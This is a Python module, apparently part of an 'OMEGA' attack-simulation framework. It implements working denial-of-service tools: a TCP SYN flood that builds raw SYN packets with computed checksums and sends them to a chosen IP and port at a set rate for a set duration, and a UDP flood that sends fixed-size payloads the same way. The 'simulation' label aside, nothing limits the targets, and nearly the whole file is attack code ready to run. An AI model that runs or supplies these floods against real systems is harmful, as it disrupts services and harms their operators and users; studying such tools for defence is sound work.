"""
OMEGA Volumetric Attack Simulation Module
Implements DDoS attack types including SYN floods and UDP floods.
"""

import socket
import struct
import random
import time
from ..utils.output import print_header, print_info, print_error, print_debug


class TCPSYNFlood:
    """
    TCP SYN Flood attack implementation using raw sockets.
    Simulates connection flood attacks.
    """
    
    def __init__(self):
        """Initialize SYN flood attack."""
        print_debug("TCP SYN Flood module initialized")
    
    def _checksum(self, data):
        """
        Calculate IP/TCP checksum.
        
        Args:
            data (bytes): Data to calculate checksum for
        
        Returns:
            int: Checksum value
        """
        s = 0
        # Handle odd length
        if len(data) % 2 == 1:
            data += b'\x00'
        
        for i in range(0, len(data), 2):
            w = data[i] + (data[i+1] << 8)
            s += w
        
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        return ~s & 0xffff
    
    def _create_tcp_syn_packet(self, source_ip, dest_ip, source_port, dest_port):
        """
        Create TCP SYN packet.
        
        Args:
            source_ip (str): Source IP address
            dest_ip (str): Destination IP address
            source_port (int): Source port
            dest_port (int): Destination port
        
        Returns:
            bytes: TCP packet data
        """
        # TCP Header (Flags: SYN=2)
        seq = random.randint(10000, 999999)
        
        tcp_header_raw = struct.pack(
            '!HHLLBBHHH',
            source_port, dest_port, seq, 0,
            (5 << 4), 2,  # Data offset (5 words), Flags (SYN)
            socket.htons(5840),  # Window size
            0, 0  # Checksum (0), Urgent pointer
        )
        
        # Pseudo header for checksum
        source_address = socket.inet_aton(source_ip)
        dest_address = socket.inet_aton(dest_ip)
        psh = struct.pack(
            '!4s4sBBH',
            source_address, dest_address, 0,
            socket.IPPROTO_TCP, len(tcp_header_raw)
        )
        psh = psh + tcp_header_raw
        
        tcp_check = self._checksum(psh)
        
        # Final TCP header with checksum
        tcp_header = struct.pack(
            '!HHLLBBH',
            source_port, dest_port, seq, 0,
            (5 << 4), 2,
            socket.htons(5840)
        ) + struct.pack('H', tcp_check) + struct.pack('!H', 0)
        
        return tcp_header
    
    def launch_attack(self, target_ip, target_port, duration_sec=10, rate=1000):
        """
        Launch TCP SYN flood attack.
        
        Args:
            target_ip (str): Target IP address
            target_port (int): Target port
            duration_sec (int): Attack duration in seconds
            rate (int): Packets per second
        
        Note:
            Requires root/Administrator privileges for raw sockets
        """
        print_header(f"TCP SYN Flood Attack: {target_ip}:{target_port}")
        print_info(f"Duration: {duration_sec}s, Rate: {rate}/s")
        
        try:
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        except PermissionError:
            print_error("Permission denied. Requires root/Administrator privileges")
            return
        except Exception as e:
            print_error(f"Error creating raw socket: {e}")
            return
        
        # Determine source IP
        try:
            s_temp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s_temp.connect((target_ip, target_port))
            source_ip = s_temp.getsockname()[0]
            s_temp.close()
        except Exception as e:
            print_error(f"Could not determine source IP: {e}")
            sock.close()
            return
        
        print_info(f"Starting attack from {source_ip}")
        
        start_time = time.time()
        packet_count = 0
        
        try:
            while time.time() - start_time < duration_sec:
                loop_start_time = time.time()
                
                for _ in range(rate):
                    source_port = random.randint(40000, 60000)
                    packet = self._create_tcp_syn_packet(
                        source_ip, target_ip,
                        source_port, target_port
                    )
                    sock.sendto(packet, (target_ip, 0))
                    packet_count += 1
                
                loop_duration = time.time() - loop_start_time
                sleep_time = max(0, 1.0 - loop_duration)
                time.sleep(sleep_time)
                
                print_debug(f"Sent {packet_count} packets...")
        
        except Exception as e:
            print_error(f"Error during attack: {e}")
        finally:
            sock.close()
        
        print_info(f"Attack complete. Total packets: {packet_count}")


class UDPFlood:
    """
    UDP Flood attack implementation for volumetric DDoS.
    """
    
    def __init__(self):
        """Initialize UDP flood attack."""
        print_debug("UDP Flood module initialized")
    
    def launch_attack(self, target_ip, target_port, duration_sec=10, rate=1000, packet_size=512):
        """
        Launch UDP flood attack.
        
        Args:
            target_ip (str): Target IP address
            target_port (int): Target port
            duration_sec (int): Attack duration in seconds
            rate (int): Packets per second
            packet_size (int): Size of each UDP packet
        """
        print_header(f"UDP Flood Attack: {target_ip}:{target_port}")
        print_info(f"Duration: {duration_sec}s, Rate: {rate}/s, Packet size: {packet_size} bytes")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except Exception as e:
            print_error(f"Error creating socket: {e}")
            return
        
        # Generate payload
        payload = b'X' * packet_size
        
        start_time = time.time()
        packet_count = 0
        
        try:
            while time.time() - start_time < duration_sec:
                loop_start_time = time.time()
                
                for _ in range(rate):
                    sock.sendto(payload, (target_ip, target_port))
                    packet_count += 1
                
                loop_duration = time.time() - loop_start_time
                sleep_time = max(0, 1.0 - loop_duration)
                time.sleep(sleep_time)
                
                print_debug(f"Sent {packet_count} packets...")
        
        except Exception as e:
            print_error(f"Error during attack: {e}")
        finally:
            sock.close()
        
        print_info(f"Attack complete. Total packets: {packet_count}")


class VolumetricAttackSimulation:
    """
    Volumetric Attack Simulation framework combining multiple attack types.
    """
    
    def __init__(self):
        """Initialize volumetric attack module."""
        self.syn_flood = TCPSYNFlood()
        self.udp_flood = UDPFlood()
        print_debug("Volumetric Attack Simulation initialized")
    
    def get_syn_flood(self):
        """Get TCP SYN flood module."""
        return self.syn_flood
    
    def get_udp_flood(self):
        """Get UDP flood module."""
        return self.udp_flood
